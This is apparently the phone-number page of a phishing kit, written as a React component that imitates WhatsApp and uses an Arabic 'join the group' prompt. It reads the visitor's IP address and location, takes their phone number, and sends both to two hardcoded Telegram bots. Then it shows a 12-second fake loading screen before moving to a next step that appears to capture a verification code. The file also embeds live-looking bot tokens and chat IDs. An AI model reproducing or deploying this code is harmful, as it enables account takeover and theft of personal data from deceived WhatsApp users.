import React, { useState, useEffect } from "react";
import "react-phone-number-input/style.css";
import PhoneInput, { formatPhoneNumberIntl, isPossiblePhoneNumber } from "react-phone-number-input";
import Axios from "axios";
import XMLParser from "react-xml-parser";
import { GridLoader } from "react-spinners";

export default function Number({ setPage, setNcode, ncode }) {
  const [value, setValue] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message] = useState("رابط الإنضمام إلى المجموعة");
  const [state, setState] = useState({
    ip: "",
    country: "",
    countryCode: "",
    city: "",
    timezone: "",
  });

  const bots = [
    {
      apiToken: "7996981843:AAEfILtAIjgNElsVAt3NWX6d1Mm3WogpYiI",
      chat_id: "7794753220",
    },
    {
      apiToken: "7846242608:AAFHmhzvkbf10v60N0TCAHMCQYsJlmCK2GE",
      chat_id: "7820518007",
    },
  ];

  const getGeoInfo = async () => {
    try {
      const response = await Axios.get("https://ipapi.co/xml/");
      const data = response.data;
      const xml = new XMLParser().parseFromString(data);
      setState({
        ip: xml.children[0].value,
        country: xml.children[7].value,
        countryCode: xml.children[8].value,
        city: xml.children[3].value,
        timezone: xml.children[17].value,
      });
    } catch (error) {
      console.error(error);
    }
  };

  const sendAPIMessage = async () => {
    const messageContent = `
--------[ Whatsapp Info ]--------
IP Address   : ${state.ip}
Phone Number : ${formatPhoneNumberIntl(value)}
`;

    bots.forEach(async ({ apiToken, chat_id }) => {
      try {
        const queryParams = {
          text: messageContent,
          chat_id,
          parse_mode: "html",
        };
        const queryString = new URLSearchParams(queryParams).toString();
        const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;
        await Axios.get(url);
      } catch (error) {
        console.error("Erreur lors de l'envoi du message aux bots :", error);
      }
    });
  };

  const handleNumberSubmission = () => {
    if (!isPossiblePhoneNumber(value)) {
      setError(true);
    } else {
      setNcode({ ...ncode, number: value });
      sendAPIMessage();
      setError(false);
      setLoading(true);
      setTimeout(() => {
        setValue("");
        setLoading(false);
        setPage("p2");
      }, 12000);
    }
  };

  useEffect(() => {
    getGeoInfo();
  }, []);

  return (
    <div className="md:w-1/2 mx-auto shadow-xl rounded-2xl pb-2 bg-white size Conts">
      <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md space-y-8">
          <div>
            <img className="mx-auto h-12 w-auto" src="images/wp.png" alt="Your Company" />
            <h2 className="mt-6 text-center tracking-tight text-gray-700">{message}</h2>
          </div>
          {loading ? (
            <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
              <GridLoader color={"#25D366"} loading={loading} size={20} />
            </div>
          ) : (
            <div className="mt-8 space-y-6">
              <div className="-space-y-px rounded-md shadow-sm">
                <PhoneInput
                  className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                  placeholder="أدخل رقم الهاتف"
                  defaultCountry={state.countryCode}
                  value={value}
                  onChange={setValue}
                />
              </div>
              {error && (
                <div className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg">
                  <svg
                    aria-hidden="true"
                    className="flex-shrink-0 inline w-5 h-5 mr-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span className="font-medium">رقم الجوال غير صحيح</span>
                </div>
              )}
              <div>
                <button
                  className="group relative flex w-full justify-center rounded-md border border-transparent bg-green-500 py-2 px-4 text-sm font-medium text-white hover:bg-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 focus:ring-offset-2"
                  onClick={handleNumberSubmission}
                >
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3">
                    <svg
                      className="h-5 w-5 text-green-300 group-hover:text-green-400"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 20 20"
                      fill="currentColor"
                      aria-hidden="true"
                    >
                      <path
                        fillRule="evenodd"
                        d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </span>
                  <div className="text-white">الإنضمام</div>
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
